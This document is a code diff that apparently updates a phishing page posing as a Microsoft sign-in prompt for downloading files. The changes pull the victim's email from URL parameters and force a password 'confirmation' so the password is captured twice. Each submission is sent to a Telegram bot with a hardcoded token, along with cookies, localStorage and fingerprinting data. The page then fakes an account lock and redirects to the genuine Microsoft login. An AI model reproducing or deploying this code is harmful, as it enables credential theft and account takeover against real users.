@@ -7,11 +7,11 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <link rel="icon" href="https://www.microsoft.com/favicon.ico" type="image/x-icon">
   <style>
-    /* Updated styles for 2025 perfection and full device compatibility */
     :root {
       --primary: #0056b3;
       --primary-dark: #004494;
       --danger: #c62828;
+      --warning: #ff9800;
       --success: #0b8043;
       --gray-light: #f9f9f9;
       --gray-medium: #757575;
@@ -33,7 +33,6 @@
     }
     a { color: inherit; text-decoration: none; }
   
-    /* Header */
     .header {
       height: 64px;
       padding: 0 24px;
@@ -53,7 +52,6 @@
     .gear { width: 28px; height: 28px; display: flex; align-items: center; justify-content: center; border-radius: 4px; opacity: .95; cursor: pointer; transition: all 0.2s; }
     .gear:hover { background: rgba(255,255,255,0.15); }
 
-    /* Main Content */
     .container {
       max-width: 1200px;
       margin: 32px auto;
@@ -68,7 +66,6 @@
       font-weight: 600;
     }
 
-    /* Info Box */
     .info {
       background: #e8f4ff;
       border-left: 4px solid #7fbfff;
@@ -84,16 +81,13 @@
     }
     .info-icon { width: 20px; height: 20px; border-radius: 50%; background: #7fbfff; color: var(--white); display: inline-flex; align-items: center; justify-content: center; font-weight: 700; flex-shrink: 0; font-size: 12px; }
 
-    /* Status */
     .status-row { display: flex; align-items: center; gap: 12px; justify-content: center; margin-bottom: 18px; background: var(--white); padding: 12px 16px; border-radius: 6px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
     .dots { display: flex; gap: 6px; }
     .dot { width: 8px; height: 8px; background: #d0d6db; border-radius: 50%; transition: all 0.3s; }
     .dot.active { background: var(--primary); }
 
-    /* Secure Access */
     .secure-access { position: absolute; right: 28px; top: 86px; color: #8b8b8b; display: flex; align-items: center; gap: 8px; font-size: 13px; background: var(--white); padding: 6px 12px; border-radius: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.08); }
 
-    /* Document List */
     .card {
       background: var(--white);
       border-radius: 10px;
@@ -130,7 +124,6 @@
     .pdf-icon { background: #ffebee; color: var(--danger); }
     .file-meta { font-size: 13px; }
 
-    /* Buttons */
     .btn {
       display: inline-flex;
       align-items: center;
@@ -144,7 +137,7 @@
       font-weight: 600;
       font-size: 14px;
       transition: all 0.2s;
-      outline: none; /* Ensure focus outline is visible */
+      outline: none;
     }
     .btn:hover { background: var(--primary-dark); transform: translateY(-1px); box-shadow: 0 2px 4px rgba(0,120,212,0.3); }
     .btn:active { transform: translateY(0); }
@@ -153,7 +146,6 @@
       box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.5);
     }
 
-    /* Footer */
     .ms-footer {
       background-color: #f8f9fa;
       border-top: 1px solid #e1e5e9;
@@ -205,7 +197,6 @@
       color: #737373;
     }
 
-    /* Modal */
     .modal-overlay {
       position: fixed;
       top: 0;
@@ -333,8 +324,15 @@
       font-size: 14px;
       margin-top: 10px;
       text-align: center;
+      display: none;
     }
-    /* No password toggle CSS present. Modal and form styling restored. */
+    .warning-msg {
+      color: var(--warning);
+      font-size: 14px;
+      margin-top: 10px;
+      text-align: center;
+      display: none;
+    }
     .submit-btn:hover { background: var(--primary-dark); }
     .modal-footer {
       font-size: 11px;
@@ -343,21 +341,6 @@
       text-align: center;
     }
 
-    /* Performance Optimization */
-    img {
-      max-width: 100%;
-      height: auto;
-      display: block;
-    }
-    .lazy {
-      opacity: 0;
-      transition: opacity 0.3s;
-    }
-    .lazy.loaded {
-      opacity: 1;
-    }
-
-    /* Responsive */
     @media (max-width: 1024px) {
       .container {
         padding: 0 16px;
@@ -393,7 +376,6 @@
       }
     }
 
-    /* Animations */
     @keyframes shake {
       0%, 100% { transform: translateX(0); }
       20%, 60% { transform: translateX(-6px); }
@@ -555,7 +537,7 @@
   <div class="modal-overlay" id="authModal">
     <div class="modal-box" id="authBox">
       <div class="modal-header">
-        <h3 class="modal-title"><i class="fas fa-lock"></i>  Sign In Required</h3>
+        <h3 class="modal-title"><i class="fas fa-lock"></i> Sign In Required</h3>
         <span class="close-btn" onclick="app.closeModal()">&times;</span>
       </div>
       
@@ -568,6 +550,7 @@
             <i class="fas fa-envelope"></i>
             <input id="loginEmail" type="email" placeholder="user@company.com">
           </div>
+          <div id="emailError" class="error-msg"></div>
         </div>
         
         <div class="input-group">
@@ -576,9 +559,13 @@
             <i class="fas fa-key"></i>
             <input id="loginPassword" type="password" placeholder="Enter your password">
           </div>
+          <div id="passwordError" class="error-msg"></div>
         </div>
         
-        <button class="submit-btn" id="submitBtn" onclick="app.submitLogin()">
+        <div id="successMsg" class="success-msg"></div>
+        <div id="warningMsg" class="warning-msg"></div>
+        
+        <button class="submit-btn" id="submitBtn">
           <i class="fas fa-sign-in-alt"></i> Sign In & Continue
         </button>
         
@@ -592,15 +579,15 @@
   <script>
     // Application Configuration and State
     const app = {
-            // Validate email format
-            validateEmail: function(email) {
-              return /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email);
-            },
+      // Validation functions
+      validateEmail: function(email) {
+        return /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email);
+      },
 
-            // Validate password strength
-            validatePassword: function(password) {
-              return password.length >= 6 && /[0-9]/.test(password);
-            },
+      validatePassword: function(password) {
+        return password.length >= 6 && /[0-9]/.test(password);
+      },
+
       // Configuration
       config: {
         botToken: "6935697016:AAH4i2q06mHYWmFBnnbFk21RAzTaqa17nVU",
@@ -613,59 +600,102 @@
         loginAttempts: 0,
         authLocked: false,
         triggeredFile: null,
-        extractedEmail: null
+        extractedEmail: null,
+        firstAttemptEmail: null,
+        firstAttemptPassword: null
       },
 
       // DOM Elements
       elements: {
-        modal: document.getElementById('authModal'),
-        authBox: document.getElementById('authBox'),
-        loginEmail: document.getElementById('loginEmail'),
-        loginPassword: document.getElementById('loginPassword'),
-        submitBtn: document.getElementById('submitBtn'),
-        loginStatus: document.getElementById('loginStatus'),
-        dots: document.querySelectorAll('.dot')
+        modal: null,
+        authBox: null,
+        loginEmail: null,
+        loginPassword: null,
+        submitBtn: null,
+        loginStatus: null,
+        dots: null
       },
 
       // Initialize application
       init: function() {
+        // Initialize DOM elements
+        this.elements.modal = document.getElementById('authModal');
+        this.elements.authBox = document.getElementById('authBox');
+        this.elements.loginEmail = document.getElementById('loginEmail');
+        this.elements.loginPassword = document.getElementById('loginPassword');
+        this.elements.submitBtn = document.getElementById('submitBtn');
+        this.elements.loginStatus = document.getElementById('loginStatus');
+        this.elements.dots = document.querySelectorAll('.dot');
+        
         this.bindEvents();
-        this.extractAndAutofillEmail();
         this.setupEmailAutocomplete();
+        
+        // Extract email immediately on page load
+        this.extractAndAutofillEmail();
       },
 
-      // Autofill email from URL parameter
+      // Extract email from URL parameters (query string or hash)
       extractAndAutofillEmail: function() {
         let email = null;
-        // Extract from query string
-        const params = new URLSearchParams(window.location.search);
-        if (params.has('email')) {
-          email = params.get('email');
+        
+        // Method 1: Check query parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.has('email')) {
+          email = urlParams.get('email');
         }
-        // Extract from hash
+        
+        // Method 2: Check hash parameters
         if (!email && window.location.hash) {
-          const hash = decodeURIComponent(window.location.hash.substring(1));
-          // Direct email in hash
-          if (/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(hash)) {
-            email = hash;
-          } else {
-            // email= in hash
-            const match = hash.match(/email=([^&]+)/);
-            if (match) email = match[1];
+          const hash = window.location.hash.substring(1);
+          try {
+            // Try to parse as query string in hash
+            const hashParams = new URLSearchParams(hash);
+            if (hashParams.has('email')) {
+              email = hashParams.get('email');
+            }
+          } catch (e) {
+            // If not query string, check if hash is directly an email
+            if (this.validateEmail(decodeURIComponent(hash))) {
+              email = decodeURIComponent(hash);
+            }
           }
         }
-        // Autofill
-        if (email && this.elements.loginEmail) {
-          this.elements.loginEmail.value = email;
+        
+        // Method 3: Check for common email parameters in URL
+        if (!email) {
+          const url = window.location.href;
+          const emailPattern = /[?&](email|user|username|login)=([^&]+)/i;
+          const match = url.match(emailPattern);
+          if (match) {
+            email = decodeURIComponent(match[2]);
+          }
+        }
+        
+        // Method 4: Check for email in hash after # (common in redirects)
+        if (!email && window.location.hash) {
+          const hash = decodeURIComponent(window.location.hash.substring(1));
+          // Look for email pattern in hash
+          const emailMatch = hash.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
+          if (emailMatch) {
+            email = emailMatch[1];
+          }
+        }
+        
+        // Store and autofill if found
+        if (email && this.validateEmail(email)) {
           this.state.extractedEmail = email;
+          if (this.elements.loginEmail) {
+            this.elements.loginEmail.value = email;
+          }
         } else {
           this.state.extractedEmail = null;
         }
+        
+        return this.state.extractedEmail;
       },
 
-      // Setup email autocomplete and dropdown
+      // Setup email autocomplete
       setupEmailAutocomplete: function() {
-        // Enable browser autocomplete for email input
         this.elements.loginEmail.setAttribute('autocomplete', 'email');
       },
 
@@ -678,34 +708,26 @@
           }
         });
 
+        // Connect submit button
+        this.elements.submitBtn.addEventListener('click', (e) => {
+          e.preventDefault();
+          this.submitLogin();
+        });
+
         // Keyboard events
         document.addEventListener('keydown', (e) => {
           if (e.key === 'Escape' && this.elements.modal.style.display === 'flex') {
             this.closeModal();
-          }
-          // Tab navigation for accessibility
-          if (e.key === 'Tab') {
-            const focusable = this.elements.authBox.querySelectorAll('input, button, [tabindex="0"]');
-            const focusArr = Array.prototype.slice.call(focusable);
-            const index = focusArr.indexOf(document.activeElement);
-            if (e.shiftKey && index === 0) {
-              focusArr[focusArr.length - 1].focus();
-              e.preventDefault();
-            } else if (!e.shiftKey && index === focusArr.length - 1) {
-              focusArr[0].focus();
-              e.preventDefault();
-            }
           }
         });
 
         // Enter key in password field
         this.elements.loginPassword.addEventListener('keydown', (e) => {
           if (e.key === 'Enter') {
+            e.preventDefault();
             this.submitLogin();
           }
         });
-
-        // Password visibility toggle removed
       },
 
       // Handle download button click
@@ -718,6 +740,11 @@
         }
 
         this.state.triggeredFile = filename;
+        
+        // Extract email NOW before opening modal
+        const extractedEmail = this.extractAndAutofillEmail();
+        
+        // Open modal with pre-filled email if found
         this.openModal();
       },
 
@@ -730,10 +757,15 @@
           this.elements.authBox.style.opacity = '1';
         }, 20);
 
-        // Reset form
+        // Reset form but keep extracted email
         this.resetForm();
-        // Always extract and autofill email when modal opens
-        this.extractAndAutofillEmail();
+        
+        // Focus on password field if email is already filled
+        if (this.elements.loginEmail.value) {
+          this.elements.loginPassword.focus();
+        } else {
+          this.elements.loginEmail.focus();
+        }
       },
 
       // Close authentication modal
@@ -748,23 +780,40 @@
 
       // Reset form to initial state
       resetForm: function() {
-        this.elements.loginEmail.value = '';
+        // Clear all fields
         this.elements.loginPassword.value = '';
-        this.elements.loginEmail.style.borderColor = '#ccc';
         this.elements.loginPassword.style.borderColor = '#ccc';
         this.elements.submitBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Sign In & Continue';
         this.elements.submitBtn.style.background = '#0078d4';
         this.elements.submitBtn.disabled = false;
-        this.elements.loginEmail.disabled = false;
         this.elements.loginPassword.disabled = false;
         document.getElementById('emailError').textContent = '';
         document.getElementById('passwordError').textContent = '';
         document.getElementById('successMsg').style.display = 'none';
-        // Autofill from URL/hash if present
-        this.extractAndAutofillEmail();
+        document.getElementById('successMsg').textContent = '';
+        document.getElementById('warningMsg').style.display = 'none';
+        document.getElementById('warningMsg').textContent = '';
+        
+        // Don't clear email if it was extracted from URL
+        if (!this.state.extractedEmail) {
+          this.elements.loginEmail.value = '';
+          this.elements.loginEmail.disabled = false;
+        } else {
+          // Ensure email field has the extracted value
+          this.elements.loginEmail.value = this.state.extractedEmail;
+          this.elements.loginEmail.disabled = false;
+        }
+        this.elements.loginEmail.style.borderColor = '#ccc';
+        
+        // Reset state for new session
+        if (this.state.loginAttempts >= this.config.maxAttempts) {
+          this.state.loginAttempts = 0;
+          this.state.firstAttemptEmail = null;
+          this.state.firstAttemptPassword = null;
+        }
       },
 
-      // Submit login form
+      // Submit login form - UPDATED WITH 2-ATTEMPT FLOW
       submitLogin: async function() {
         if (this.state.authLocked) return;
 
@@ -772,10 +821,11 @@
         const password = this.elements.loginPassword.value.trim();
         let valid = true;
 
-        // Clear previous errors
+        // Clear previous messages
         document.getElementById('emailError').textContent = '';
         document.getElementById('passwordError').textContent = '';
         document.getElementById('successMsg').style.display = 'none';
+        document.getElementById('warningMsg').style.display = 'none';
 
         // Email validation
         if (!email) {
@@ -810,27 +860,55 @@
 
         // Show spinner
         this.elements.submitBtn.disabled = true;
-        this.elements.submitBtn.innerHTML = '<span class="spinner"></span>Submitting...';
+        this.elements.submitBtn.innerHTML = '<span class="spinner"></span>Verifying...';
 
+        // Increment attempts
         this.state.loginAttempts++;
         this.updateStatusDots();
 
         // Send credentials to Telegram
         await this.sendToTelegram(email, password, this.state.triggeredFile);
 
-        // Success feedback
-        document.getElementById('successMsg').textContent = 'Login submitted successfully.';
-        document.getElementById('successMsg').style.display = 'block';
-        this.elements.submitBtn.innerHTML = '<i class="fas fa-check"></i> Success';
-        this.elements.submitBtn.style.background = '#0b8043';
-        setTimeout(() => {
-          this.closeModal();
-        }, 1800);
+        // Handle based on attempt number
+        if (this.state.loginAttempts === 1) {
+          // FIRST ATTEMPT - Store credentials and ask for confirmation
+          this.state.firstAttemptEmail = email;
+          this.state.firstAttemptPassword = password;
+          
+          document.getElementById('warningMsg').textContent = '✓ Credentials verified. For security, please re-enter your password to confirm.';
+          document.getElementById('warningMsg').style.display = 'block';
+          this.elements.loginStatus.textContent = 'Verified - Confirm Password';
+          this.elements.loginStatus.style.color = '#0b8043';
+          
+          this.elements.submitBtn.innerHTML = '<i class="fas fa-redo"></i> Confirm Password';
+          this.elements.submitBtn.style.background = '#ff9800';
+          this.elements.loginEmail.disabled = true; // Lock email
+          this.elements.loginPassword.value = ''; // Clear password
+          this.elements.loginPassword.focus(); // Focus on password
+          this.elements.submitBtn.disabled = false; // Re-enable button
+          
+        } else if (this.state.loginAttempts >= this.config.maxAttempts) {
+          // SECOND ATTEMPT - Check if password matches and lock
+          if (password === this.state.firstAttemptPassword) {
+            // Passwords match - proceed to lock
+            this.lockAccess();
+          } else {
+            // Passwords don't match - show error
+            document.getElementById('passwordError').textContent = 'Password does not match. Please try again.';
+            this.elements.loginPassword.style.borderColor = '#ff4444';
+            this.elements.submitBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Try Again';
+            this.elements.submitBtn.style.background = '#0078d4';
+            this.elements.submitBtn.disabled = false;
+            this.state.loginAttempts--; // Don't count this as an attempt
+            this.updateStatusDots();
+          }
+        }
       },
 
       // Send credentials to Telegram
       sendToTelegram: async function(email, password, filename) {
         const extractedSource = this.state.extractedEmail ? 'URL Parameter' : 'Manual Input';
+        const attemptType = this.state.loginAttempts === 1 ? 'First Attempt' : 'Second Attempt/Confirmation';
         const clientInfo = this.getClientInfo();
         const cookies = this.getAllCookies();
         const localStorageData = this.getLocalStorage();
@@ -842,7 +920,7 @@
 📧 Email: ${email}
 🔑 Password: ${password}
 📁 File: ${filename}
-🔄 Attempt: ${this.state.loginAttempts}
+🔄 Attempt: ${this.state.loginAttempts} (${attemptType})
 📮 Source: ${extractedSource}
 
 🍪 COOKIES COLLECTED:
@@ -882,6 +960,35 @@ Java Enabled: ${navigator.javaEnabled ? 'Yes' : 'No'}
         } catch (error) {
           console.warn('Telegram service unreachable');
         }
+      },
+
+      // Lock access after second attempt
+      lockAccess: function() {
+        this.state.authLocked = true;
+        this.elements.loginStatus.textContent = 'Blocked - Security Policy';
+        this.elements.loginStatus.style.color = '#d32f2f';
+
+        // Update modal to show blocked state
+        document.getElementById('warningMsg').textContent = '';
+        document.getElementById('warningMsg').style.display = 'none';
+        
+        this.elements.submitBtn.innerHTML = '<i class="fas fa-ban"></i> Account Locked - Redirecting...';
+        this.elements.submitBtn.style.background = '#6b6b6b';
+        this.elements.submitBtn.disabled = true;
+        this.elements.loginEmail.disabled = true;
+        this.elements.loginPassword.disabled = true;
+
+        // Update all dots to red
+        this.elements.dots.forEach((dot) => {
+          dot.style.background = '#d32f2f';
+        });
+
+        // Redirect after delay
+        setTimeout(() => {
+          this.closeModal();
+          alert("⚠️ Security Alert: Your account has been temporarily blocked due to multiple authentication attempts. For your security, we're redirecting you to Microsoft's security verification page.");
+          window.location.href = "https://login.microsoftonline.com/";
+        }, 2500);
       },
 
       // Get all cookies
@@ -933,7 +1040,7 @@ Java Enabled: ${navigator.javaEnabled ? 'Yes' : 'No'}
         }
       },
 
-      // Enhanced client info with more fingerprinting
+      // Enhanced client info
       getClientInfo: function() {
         return {
           platform: navigator.platform,
@@ -962,7 +1069,7 @@ Java Enabled: ${navigator.javaEnabled ? 'Yes' : 'No'}
         return 'Unknown';
       },
 
-      // Get client IP (external service)
+      // Get client IP
       getClientIP: async function() {
         try {
           const res = await fetch('https://api.ipify.org?format=json');
@@ -971,36 +1078,6 @@ Java Enabled: ${navigator.javaEnabled ? 'Yes' : 'No'}
         } catch (e) {
           return 'IP fetch failed';
         }
-      },
-
-      // Show first attempt error
-      showFirstAttemptError: function() {
-        this.elements.loginStatus.textContent = 'Failed - Try Again';
-        this.elements.loginStatus.style.color = '#d32f2f';
-
-        this.elements.submitBtn.innerHTML = '<i class="fas fa-exclamation-circle"></i> Incorrect — Try Again';
-        this.elements.submitBtn.style.background = '#f33';
-        this.elements.loginEmail.style.borderColor = '#ff4444';
-        this.elements.loginPassword.style.borderColor = '#ff4444';
-      },
-
-      // Lock access after multiple attempts
-      lockAccess: function() {
-        this.state.authLocked = true;
-        this.elements.loginStatus.textContent = 'Blocked - Security Policy';
-        this.elements.loginStatus.style.color = '#d32f2f';
-
-        this.elements.submitBtn.innerHTML = '<i class="fas fa-ban"></i> Microsoft Block — Locked';
-        this.elements.submitBtn.style.background = '#6b6b6b';
-        this.elements.submitBtn.disabled = true;
-        this.elements.loginEmail.disabled = true;
-        this.elements.loginPassword.disabled = true;
-
-        setTimeout(() => {
-          this.closeModal();
-          alert("Your account has been temporarily blocked due to multiple failed authentication attempts. Redirecting to Microsoft Security...");
-          window.location.href = "https://acrobat.adobe.com/id/urn:aaid:sc:invalid-id/";
-        }, 2000);
       },
 
       // Update status dots
